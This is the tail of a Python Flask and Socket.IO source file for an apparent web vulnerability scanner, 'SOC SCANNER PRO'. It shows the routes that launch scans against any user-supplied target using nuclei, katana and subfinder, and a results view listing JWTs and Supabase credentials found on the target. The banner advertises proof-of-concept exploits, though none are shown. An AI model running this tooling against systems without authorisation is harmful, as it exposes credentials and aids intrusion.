  if(!jt.length&&!su.length&&!sk.length&&!sp.length&&!vl.length){html+='<div class="em" style="color:var(--gn);padding:20px">Sem JWT ou credenciais Supabase encontrados. Alvo parece limpo.</div>';}
  document.getElementById('jwt-area').innerHTML=html;
}
})();
</script></body></html>"""

@app.route('/')
def index(): return render_template_string(HTML)

@app.route('/health')
def health():
    from flask import jsonify
    return jsonify({'status':'ok','tools':{'nuclei':os.path.exists(NUCLEI),'katana':os.path.exists(KATANA),'subfinder':os.path.exists(SUBFINDER)}})

@sio.on('connect')
def on_connect():
    print('[WS] Conectado: '+str(request.sid))
    emit('log',{'msg':'Servidor ligado!','level':'ok'})

@sio.on('disconnect')
def on_disconnect():
    print('[WS] Desconectado: '+str(request.sid))

@sio.on('start_scan')
def handle_scan(data):
    target=data.get('target','').strip() if data else ''
    if not target: emit('scan_error',{'error':'Alvo invalido'}); return
    sid=request.sid
    threading.Thread(target=lambda:Scanner(target,sid).run(),daemon=True).start()

PORT=find_port()
my_ip=socket.gethostbyname(socket.gethostname())
print('\n'+'='*52)
print('  SOC SCANNER PRO v5.0 + PoC COMPLETO')
print('  13 PoCs reais + Nuclei + Katana + Subs')
print('  Local: http://localhost:'+str(PORT))
print('  Rede:  http://'+my_ip+':'+str(PORT))
print('='*52+'\n')
sio.run(app,host='0.0.0.0',port=PORT,debug=False,allow_unsafe_werkzeug=True)
